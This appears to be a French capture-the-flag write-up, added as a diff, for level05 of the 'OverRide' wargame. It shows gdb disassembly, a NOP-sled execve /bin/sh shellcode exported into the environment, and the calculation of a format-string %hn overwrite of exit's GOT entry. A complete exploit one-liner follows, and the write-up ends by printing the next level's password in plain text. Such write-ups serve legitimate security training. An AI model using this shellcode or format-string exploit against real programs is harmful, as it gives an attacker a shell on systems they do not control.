@@ -1,0 +1,43 @@
+source: https://repo.zenk-security.com/Techniques%20d.attaques%20%20.%20%20Failles/Les%20failles%20Format%20String.pdf
+Dans ce niveau nous allons nous servir de la faille %n du printf
+
+   0x080484f9 <+181>:	sub    $0x1,%eax
+   0x080484fc <+184>:	cmp    %eax,%ebx
+   0x080484fe <+186>:	jb     0x8048487 <main+67>
+   0x08048500 <+188>:	lea    0x28(%esp),%eax
+   0x08048504 <+192>:	mov    %eax,(%esp)
+   0x08048507 <+195>:	call   0x8048340 <printf@plt>
+   0x0804850c <+200>:	movl   $0x0,(%esp)
+   0x08048513 <+207>:	call   0x8048370 <exit@plt>
+End of assembler dump.
+(gdb) x/i 0x8048370
+   0x8048370 <exit@plt>:	jmp    *0x80497e0
+(gdb) x 0x80497e0
+   0x80497e0 <exit@got.plt>:	jbe    0x8049765 <_DYNAMIC+105>
+
+on remarque que le programme fais appels à la fonction exit en passant par l'adresse `0x80497e0` cette addresse étant modifiable
+nous allons la reecrire en passant par printf et le faire pointer vers un SHELLCODE.
+
+
+export SHELLCODE=`python -c 'print("\x90" * 20 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80")'`
+
+
+(gdb) x/s *((char **) environ)
+0xffffd88d:	 "SHELLCODE=\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\061\300Ph//shh/bin\211\343\211\301\211°\v̀1\300@̀"
+(gdb) x 0xffffd88d + 25
+0xffffd8a6:	 "\220\220\220\220\220\061\300Ph//shh/bin\211\343\211\301\211°\v̀1\300@̀"
+(gdb) x/xw 0xffffd88d + 25
+0xffffd8a6:	0x90909090
+
+0xffffd8a6		d8a6		ffff
+				55462		65535
+
+65535 - 55462 = 10073
+
+une fois c'est information récuperer il suffit d'ecrire la ligne en suivant ce format :
+[addr 1er %hn][addr 2eme %hn][X char][%10$hn][Y char][%11hn]
+
+level05@OverRide:~$ cat <(python -c 'print("\xe0\x97\x04\x08" + "\xe2\x97\x04\x08"+ "%55454x" + "%10$hn" + "%10073x" + "%11$hn")') - | ./level05
+
+cat /home/users/level06/.pass
+h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq
